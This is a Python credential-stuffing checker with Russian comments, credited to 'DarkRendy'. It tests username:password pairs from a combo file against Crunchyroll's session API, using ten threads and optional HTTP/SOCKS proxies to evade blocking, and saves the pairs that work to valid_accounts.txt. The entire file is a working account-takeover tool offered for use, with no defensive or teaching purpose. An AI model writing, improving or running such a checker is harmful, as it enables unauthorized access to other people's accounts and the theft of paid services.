import os
import requests
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, init

# Инициализация Colorama для цветного вывода в консоль
init()

# Вывод информации об авторе
print("Автор: DarkRendy")

# Функция для проверки валидности аккаунта Crunchyroll
def check_account(username, password, proxy_dict=None):
    url = "https://api.crunchyroll.com/start_session.0.json"
    params = {
        "account": username,
        "password": password
    }
    try:
        response = requests.get(url, params=params, proxies=proxy_dict, timeout=10)
        if response.status_code == 200:
            data = response.json()
            if "error" not in data:
                return username, password, True
    except requests.exceptions.ProxyError:
        print(Fore.RED + "Ошибка прокси." + Fore.RESET)
    except requests.exceptions.ConnectTimeout:
        print(Fore.RED + "Тайм-аут подключения." + Fore.RESET)
    return username, password, False

# Функция для записи валидных аккаунтов и вывода результатов с цветом
def save_valid_account(account_data):
    username, password, is_valid = account_data
    if is_valid:
        with open('valid_accounts.txt', 'a') as valid_file:
            valid_file.write(f"{username}:{password}\n")
        print(Fore.GREEN + f"Аккаунт {username} с паролем {password} валиден." + Fore.RESET)
    else:
        print(Fore.RED + f"Аккаунт {username} с паролем {password} невалиден." + Fore.RESET)

# Функция для выбора файла прокси из директории
def choose_proxy_file(proxy_type):
    files = [f for f in os.listdir('.') if os.path.isfile(f) and f.endswith('.txt')]
    print(f"Доступные файлы прокси для {proxy_type.upper()}:")
    for idx, file in enumerate(files, 1):
        print(f"{idx}. {file}")
    choice = input("Введите номер файла, который хотите использовать: ")
    try:
        proxy_file = files[int(choice) - 1]
        return proxy_file
    except (IndexError, ValueError):
        print("Неверный выбор файла. Попробуйте снова.")
        return None

# Функция для выбора прокси
def get_proxy_choice():
    print("Выберите режим работы:")
    print("1. Без прокси")
    print("2. HTTP")
    print("3. HTTPS")
    print("4. SOCKS4")
    print("5. SOCKS5")
    choice = input("Введите номер опции: ")
    if choice == "1":
        return None
    elif choice in ["2", "3", "4", "5"]:
        proxy_type = "http" if choice == "2" else "https" if choice == "3" else "socks4" if choice == "4" else "socks5"
        proxy_file = choose_proxy_file(proxy_type)
        if proxy_file:
            with open(proxy_file, 'r') as file:
                proxies = file.readlines()
            proxy = proxies[0].strip()  # Берем первый прокси из списка
            return {f"{proxy_type}": f"{proxy_type}://{proxy}"}
    else:
        print("Неверный выбор. Используется режим без прокси.")
        return None

# Основная функция для запуска проверки аккаунтов с использованием пула потоков
def main():
    proxy_dict = get_proxy_choice()
    # Чтение данных аккаунтов из файла
    with open('accounts.txt', 'r') as file:
        accounts = file.readlines()

    # Создание пула потоков для параллельной проверки аккаунтов
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(check_account, *(account.strip().split(':')), proxy_dict) for account in accounts]
        for future in futures:
            save_valid_account(future.result())

if __name__ == "__main__":
    main()
